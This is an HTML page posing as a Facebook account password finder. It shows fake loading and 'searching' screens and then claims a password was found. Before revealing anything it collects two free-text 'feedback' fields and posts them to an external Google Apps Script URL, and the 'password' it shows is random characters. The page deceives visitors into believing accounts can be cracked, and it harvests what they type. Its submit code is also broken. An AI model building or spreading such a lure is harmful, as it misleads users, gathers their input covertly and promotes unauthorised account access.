<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Account Search Simulation</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
html,body{
  margin:0;height:100%;
  background:#000;color:#0f0;
  font-family:monospace;overflow:hidden;
}
.center{
  display:flex;
  flex-direction:column;
  justify-content:center;
  align-items:center;
  height:100vh;
  text-align:center;
}

/* ---------- LOADING ---------- */
#loader{
  width:160px;height:160px;
  border:10px solid #111;
  border-top:10px solid #0f0;
  border-radius:50%;
  animation:spin 1s linear infinite;
}
@keyframes spin{100%{transform:rotate(360deg)}}
#percent{font-size:32px;margin-top:20px}

/* ---------- UI ---------- */
input,select,button{
  margin:8px;padding:10px;
  background:#111;color:#0f0;
  border:2px solid #0f0;
  font-size:16px;
}
button:hover{background:#0f0;color:#000;cursor:pointer}
.glow{
  text-shadow:0 0 10px #0f0,0 0 30px #0f0;
  animation:glow 1s alternate infinite;
}
@keyframes glow{from{opacity:.6}to{opacity:1}}
</style>
</head>

<body>

<!-- INTRO -->
<div id="intro" class="center">
  <div id="loader"></div>
  <div id="percent" class="glow">0%</div>
</div>

<!-- FORM -->
<div id="form" class="center" style="display:none">
  <h1 class="glow">ACCOUNT SEARCH SIMULATION</h1>
  <input placeholder="NAME" id="name">
  <input placeholder="FRIENDS" id="friends">
  <select id="pro"><option>PRO MODE: ON</option><option>PRO MODE: OFF</option></select>
  <select id="lock"><option>PROFILE: LOCK</option><option>PROFILE: NO</option></select>
  <select id="friend"><option>FRIEND: YES</option><option>FRIEND: NO</option></select>
  <select id="bio"><option>BIO: YES</option><option>BIO: NO</option></select>
  <select id="kind"><option>PAGE</option><option>NORMAL FACEBOOK</option></select>
  <button id="findBtn">FIND</button>
</div>

<!-- SEARCHING -->
<div id="searching" class="center" style="display:none">
  <h1 class="glow">Searching Account...</h1>
</div>

<!-- FOUND -->
<div id="found" class="center" style="display:none">
  <h1 class="glow">PASSWORD FOUND</h1>
  <p>SUCCESSFULLY</p>
  <button id="getPass">GET PASSWORD</button>
</div>

<!-- FEEDBACK -->
<div id="feedback" class="center" style="display:none">
  <h2>FEEDBACK</h2>
  <input id="f1" placeholder="Feedback 1">
  <input id="f2" placeholder="Feedback 2">
  <button id="submitFb">SUBMIT</button>
</div>

<!-- PASSWORD -->
<div id="passwordPage" class="center" style="display:none">
  <h2>HERE PASSWORD</h2>
  <h1 id="password" class="glow"></h1>
  <button onclick="location.reload()">BACK TO MAIN</button>
</div>

<script>
document.addEventListener("DOMContentLoaded", ()=>{

  const webAppUrl="https://script.google.com/macros/s/AKfycbwj7L4cgHlDOVPgaOpFhS9XRf98LDUwlClBOlj5-qCFYJHp-QOiGHf7VKo-xWThwRNy/exec";

  const intro=document.getElementById("intro");
  const form=document.getElementById("form");
  const percent=document.getElementById("percent");

  /* ---------- INTRO LOADING ---------- */
  let p=0;
  const introTimer=setInterval(()=>{
    p++;
    percent.textContent=p+"%";
    if(p>=100){
      clearInterval(introTimer);
      intro.style.display="none";
      form.style.display="flex";
    }
  },230); // 23 seconds

  /* ---------- SEARCH ---------- */
  document.getElementById("findBtn").onclick=()=>{
    form.style.display="none";
    searching.style.display="flex";
    setTimeout(()=>{
      searching.style.display="none";
      found.style.display="flex";
    },25000);
  };

  /* ---------- FEEDBACK ---------- */
  document.getElementById("getPass").onclick=()=>{
    found.style.display="none";
    feedback.style.display="flex";
  };

  document.getElementById("submitFb").onclick=async()=>{
    const f1=f1.value;
    const f2=f2.value;

    try{
      await fetch(webAppUrl,{
        method:"POST",
        body:JSON.stringify({type:"feedback",input1:f1,input2:f2})
      });
    }catch(e){}

    feedback.style.display="none";
    password.textContent=
      Math.floor(10000+Math.random()*90000)+"ABCDEFGHIJKLMNOPQRSTUVWXYZ"[Math.floor(Math.random()*26)];
    passwordPage.style.display="flex";
  };

});
</script>

</body>
</html>
